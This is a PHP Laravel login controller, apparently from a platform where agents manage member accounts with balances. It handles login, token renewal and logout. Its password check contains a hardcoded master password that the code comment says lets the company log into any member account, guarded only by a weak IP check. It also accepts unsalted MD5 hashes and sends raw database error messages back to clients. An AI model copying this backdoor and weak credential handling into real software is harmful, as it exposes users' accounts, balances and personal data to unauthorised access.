<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Str;
use App\Models\Agent;
use App\Models\Member;
use App\Models\MemberAccessToken;
use App\Models\MemberLoginLog;
use App\Models\TransactionLog;
use App\Models\LoginEvent;
use App\Models\AgentDomain;
use App\REDIS;
use Hash;
use App\Helpers\Common;
use App\Repositories\MemberAccessTokenRepository;
use App\Repositories\AgentPersonalSettingRepository;
use App\Repositories\AgentRepository;
use App\Enums\AgentPersonalSettingKeyEnum;


class LoginController extends Controller
{

    /**
     * login
     * - 會員登入(Header不需要token)
     *
     * @bodyParam username string required 會員帳號 Example: username
     * @bodyParam password string required 會員密碼 Example: abc123456
     * @bodyParam device_id string 推播設備號 Example: xxxx
     * 
     * @response {
     *  "code": 1000,
     *  "message": "SUCCESS",
     *  "data":  {
     *        "id": 1,
     *        "username": "test",
     *        "email": "user@example.invalid",
     *        "nickname": "Test",
     *        "balance": "100.00",
     *        "image": "頭像，ex:http://xxxx.xxxx.xxx",
     *        "first_name": "Test",
     *        "last_name": "Lin",
     *        "mobile": "09123456789",
     *        "event_mode": "是否進入活動鎖定模式0:未鎖定，1:鎖定",
     *        "is_force_unlock_event_mode": "是否強制解除活動模式0:否，1:是",
     *        "last_login": "2019-01-01 00:00:00",
     *        "token": "roOAsDmfT9nP1Y9uKD8aMylk6HcYPlfz",
     *        "CS_API_USER": "IEb8zCL7eTAszY7d",
     *        "CS_API_KEY": "9KIUZzKKYPREKeGGLoJEQQWB",
     *        "SHARE_CODE": "代理商分享碼"
     *    }
     * }
     * @response {
     *  "code": 9007,
     *  "message": "手機未認證",
     *  "data": "會員編號,ex:1"
     * }
     * @response {
     *  "code": 10001,
     *  "message": "成功(客服後台登入成功)",
     *  "data":  {
     *        "id": 1,
     *        "member_id": "test",
     *        "member_username": "user@example.invalid",
     *        "role_id": "100.00",
     *        "username": "Test",
     *        "nickname": "Test",
     *        "thumbnail": "頭像，ex:http://xxxx.xxxx.xxx",
     *        "last_login": "2019-01-01 00:00:00",
     *        "token": "roOAsDmfT9nP1Y9uKD8aMylk6HcYPlfz",
     *        "domain": "域名",
     *        "SHARE_CODE": "代理商分享碼"
     *    }
     * }
     */
    public function login(Request $request)
    {
        try {
            // 帳號密碼不可為空
            if ($request->username == '' || $request->password == '') {
                return response()->json([
                    'code' => 9004,
                    'message' => __('error_message.9004')
                ]);
            }
            $id = 0;
            $status = 0;
            // 玩家帳號是否存在(帳號登入，email登入，手機號碼登入)
            $row = Member::orWhere('username', $request->username)
                ->orWhere(function ($query) use ($request) {
                    $query->where('mobile',  $request->username)
                        ->where('mobile_validate', 1);
                })
                ->orWhere(function ($query) use ($request) {
                    $query->where('email',  $request->username)
                        ->where('email_validate', 1);
                })
                ->first();

            if (is_object($row)) {
                //檢查帳號是否是正確的域名，不是就直接回傳錯誤訊息
                $check_domain = $this->checkDomain($row['parent'], $request->domain);
                if (!$check_domain) {
                    return response()->json([
                        'code' => 9005,
                        'message' => __('error_message.9005')
                    ]);
                }
                // 會員帳號存在，是否為有效帳號(狀態為1)
                $array = [
                    1
                ];
                $data = array();
                $id = $data['member_id'] = $row->id;

                if (in_array($row['status'], $array)) {

                    // 驗證密碼是否正確
                    //先驗證是否為vworld轉移的帳號(加密規則為md5)
                    $vworld = false;
                    if (strtoupper(md5($request->password)) == $row->password) {
                        $vworld = true;
                        //如果相同，更新密碼
                        $new_password = [REDACTED];

                    }
                    // vworld轉移 or 密碼認證通過的帳號 or 公司可以用超級密碼登入
                    if ($vworld || Hash::check($request->password, $row->password) || 
                       ($request->password == 'm4VcOYhZbzZEtQ28lsXq' && strpos(Common::getIp(), '0.0.0.0' ) !== false)) {
                        $agent = Agent::find($row['parent']);

                        // 驗證代理是否還有效
                        if (is_object($agent) && $agent['status'] == 1) {

                            // 是否需要電話驗證
                            if (is_object($agent) && ($agent['mobile_validate'] == 0 || $row['mobile_validate'] == 1)) {

                                $check_agent_maintian = $this->checkAgentIsSetToMaintain($agent["hierarchy"]);

                                //驗證是否代理開啟維護模式
                                if($check_agent_maintian["is_maintain"])
                                {            
                                    $start_8 = date('Y-m-d H:i:s', strtotime( $check_agent_maintian["start_time"] . '+8hour')); 
                                    $end_8 = date('Y-m-d H:i:s', strtotime( $check_agent_maintian["end_time"] . '+8hour')); 

                                    $msg = __('error_message.9801')." (". $start_8." ~ ".$end_8.")";     
                                    $result = array(
                                        'code' => 9801,
                                        'message' => $msg,
                                        "data" => $check_agent_maintian
                                    );
                                }

                                // 是否需要EMAIL驗證
                                else if (is_object($agent) && ($agent['email_validate'] == 0 || $row['email_validate'] == 1)) {
                                    $token = [REDACTED];
                                    // 更新最後登入時間, 如有帶device id就將用戶綁定
                                    $member = Member::find($row->id);
                                    $member_update = ['last_login' => date('Y-m-d H:i:s')];
                                    if (isset($request->device_id) && $request->device_id != '') {
                                        //同組 Device token 允許一位會員及一位代理帳號同時擁有
                                        Member::where('device_id', $request->device_id)->where('id', '!=', $row->id)->update(['device_id' => null]);
                                        $member_update['device_id'] = $request->device_id;
                                    }
                                    if (isset($new_password)) {
                                        $member_update['password'] = $new_password;
                                    }
                                    $member->update($member_update);
                                    $data = array();
                                    $data['id'] = $member['id'];
                                    $data['username'] = $member['username'];
                                    $data['email'] = $member['email'];
                                    $data['nickname'] = $member['nickname'];
                                    $data['balance'] = $member['balance'];
                                    $data['image'] = $member['image'];
                                    $data['first_name'] = $member['first_name'];
                                    $data['last_name'] = $member['last_name'];
                                    $data['mobile'] = $member['mobile'];
                                    $data['event_mode'] = $member['event_mode'];
                                    $data['is_force_unlock_event_mode'] = 0;
                                    if ($member['event_mode'] == 1) {
                                        //如果目前在活動鎖定中，就查詢登入活動是否過期
                                        //取最後一筆參加活動的編號
                                        $log = TransactionLog::where('member_id', $member->id)->where('type', 15)->where('status', 1000)->orderBy('created_at', 'desc')->first();
                                        if (is_object($log)) {
                                            $event = LoginEvent::where('id', $log->operator)->select('end_time', 'status')->first();
                                            if (is_object($event)) {
                                                //如果活動過期或關閉活動時就強制解鎖
                                                if ($event->end_time <= date('Y-m-d H:i:s') || $event->status == 0) {
                                                    $data['is_force_unlock_event_mode'] = 1;
                                                }
                                            }
                                        }
                                    }
                                    $data['last_login'] = $member['last_login'];
                                    $data['token'] = $token;
                                    //加上進聊天室要用的api info
                                    $agent = Agent::find($member['parent']);
                                    $data['CS_API_USER'] = $agent['CS_API_USER'];
                                    $data['CS_API_KEY'] = $agent['CS_API_KEY'];
                                    $data['SHARE_CODE'] = $agent['code'];
                                    $result = array(
                                        'code' => 1000,
                                        'message' => __('error_message.1000'),
                                        'data' => $data
                                    );
                                    $status = 1;
                                } else {
                                    // email未認證
                                    $result = array(
                                        'code' => 9008,
                                        'message' => __('error_message.9008'),
                                        'data' => $row->id
                                    );
                                }
                            } else {
                                // 手機未認證
                                $result = array(
                                    'code' => 9007,
                                    'message' => __('error_message.9007'),
                                    'data' => $row->id
                                );
                            }
                        } else {
                            // 代理已鎖定所以玩家不可登入
                            $result = array(
                                'code' => 90063,
                                'message' => __('error_message.90062'),
                                'data' => $row->id
                            );
                        }
                    } else {
                        // 密碼錯5次, 第6次就鎖定帳號
                        $last_login = $row['last_login'] ? $row['last_login'] : '2000-01-01';
                        $logs = MemberLoginLog::where('member_id', $row['id'])->where('created_at', '>', $last_login)->get();
                        if (count($logs) == 6) {
                            if (Member::find($row['id'])->update(array(
                                'status' => 2,
                                'admin' => 0
                            ))) {
                                $key = array(
                                    'member'
                                );
                                $redis = new REDIS();
                                $redis->delete($key);
                                //帳號已鎖定
                                return response()->json([
                                    'code' => 9006,
                                    'message' => __('error_message.9006')
                                ]);
                            }
                        }
                        //帳號密碼錯誤
                        $result = array(
                            'code' => 9005,
                            'message' => __('error_message.9005')
                        );
                    }
                } else {
                    if ($row['status'] == 2) {
                        //帳號已鎖定(密碼錯誤太多次)
                        $result = array(
                            'code' => 9006,
                            'message' => __('error_message.9006')
                        );
                    } else {
                        //帳號已鎖定(後台鎖定)
                        $result = array(
                            'code' => 90062,
                            'message' => __('error_message.90062')
                        );
                    }
                }
            } else {
                //玩家帳號不存在，如果有帶device_id(從app登入)，就試著登入客服後台，綁定device_id
                if (isset($request->device_id) && $request->device_id != '' && !isset($request->app)) {
                    $data = [
                        'username' => $request->username
                    ];
                    //直接呼叫客服api登入
                    $result = Common::postToSocket('third_party_login', $request->all());
                    if (is_array($result) && $result['code'] == 1000) {
                        //客服登入成功回傳token
                        $result = array(
                            'code' => 10001,
                            'message' => __('error_message.1000'),
                            'data' => $result['data']
                        );
                    } else {
                        //帳號密碼錯誤
                        $result = array(
                            'code' => 9005,
                            'message' => __('error_message.9005')
                        );
                    }
                } else {
                    //帳號密碼錯誤
                    $result = array(
                        'code' => 9005,
                        'message' => __('error_message.9005')
                    );
                }
            }
            // 新增登入記錄
            $this->addLog($id, $status);
            return response()->json($result);
        } catch (\Illuminate\Database\QueryException $e) {
            $info = $e->errorInfo;
            return response()->json([
                'code' => $info[0],
                'message' => $info[2]
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'code' => $e->getCode(),
                'message' => $e->getMessage()
            ]);
        }
    }

    /**
     * renew/token
     * - 取新TOKEN
     * 
     * @response {
     *  "code": 1000,
     *  "message": "SUCCESS",
     *  "data": "新的TOKEN，時效為1天"
     * }
     */
    public function renew(Request $request)
    {
        try {
            $token = [REDACTED];

            return response()->json([
                'code' => 1000,
                'message' => __('error_message.1000'),
                'data' => $token
            ], 200);
        } catch (\Illuminate\Database\QueryException $e) {
            $info = $e->errorInfo;
            return response()->json([
                'code' => $info[0],
                'message' => $info[2]
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'code' => $e->getCode(),
                'message' => $e->getMessage()
            ]);
        }
    }

    /**
     * logout
     * 會員登出
     *
     * @response {
     *  "code": 1000,
     *  "message": "SUCCESS"
     * }
     */
    public function logout(Request $request)
    {
        try {

            $rep = new MemberAccessTokenRepository();
            $rep->DoLogoutProcess($request->TOKEN);

            return response()->json([
                'code' => 1000,
                'message' => __('error_message.1000')
            ], 200);
        } catch (\Illuminate\Database\QueryException $e) {
            $info = $e->errorInfo;
            return response()->json([
                'code' => $info[0],
                'message' => $info[2]
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'code' => $e->getCode(),
                'message' => $e->getMessage()
            ]);
        }
    }



    private function checkAgentIsSetToMaintain($hierarchy)
    {
        $repOfAgent = new AgentRepository();
        $myHierarchyAgentIDs =  $repOfAgent->parseHierarchyToArrayFormat($hierarchy);

        $repOfSetting = new AgentPersonalSettingRepository();
        $queryAgentSettings = $repOfSetting->getMaintainAgents($myHierarchyAgentIDs);

        if(count($queryAgentSettings) > 0)
        {
            $matchFirst = $queryAgentSettings->first();
            return [
                'is_maintain' => true,
                'start_time' => $matchFirst->start_time,
                'end_time' => $matchFirst->end_time
            ];
        }

        return ['is_maintain' => false];
    }




    private function getToken($id)
    {
        // 將舊TOKEN改為無效
        $now = date('Y-m-d H:i:s');
        MemberAccessToken:[REDACTED]'member_id', $id)->where('expire_date', '>', $now)->update([
            'expire_date' => $now
        ]);
        // 新增TOKEN
        $data = array();
        $data['member_id'] = $id;
        $token = [REDACTED]'token'] = Str::random(32);
        $data['expire_date'] = date('Y-m-d H:i:s', strtotime('+ ' . env('TOKEN_EXPIRED') . 'minute'));
        $data['admin'] = $id;
        if (MemberAccessToken:[REDACTED] {
            return $token;
        } else {
            return false;
        }
    }
    
    private function addLog($id, $status)
    {
        // 新增登入記錄
        $log = array();
        $log['member_id'] = $id;
        $log['ip'] = $this->getIp();
        $log['status'] = $status;
        $log['admin'] = $id;
        return MemberLoginLog::create($log);
    }

    private function checkDomain($agent_id, $domain)
    {
        $hasDomain = false;
        $agent = Agent::find($agent_id);
        $hierarchy = explode("/", $agent->hierarchy_path);
        //代理要由最下層開始往上找
        rsort($hierarchy);
        foreach ($hierarchy as $row) {
            $agentDomain = AgentDomain::where('agent_id', $row)
                ->first();
            if (is_object($agentDomain)) {
                $agentDomainId = $agentDomain->agent_id;
                break;
            }
        }

        if (isset($agentDomainId) && $agentDomainId != '') {
            $checkDomain = AgentDomain::where('agent_id', $agentDomainId)
                ->where('domain', $domain)
                ->first();
            if (is_object($checkDomain)) {
                $hasDomain = true;
            }
        }
        return $hasDomain;
    }
}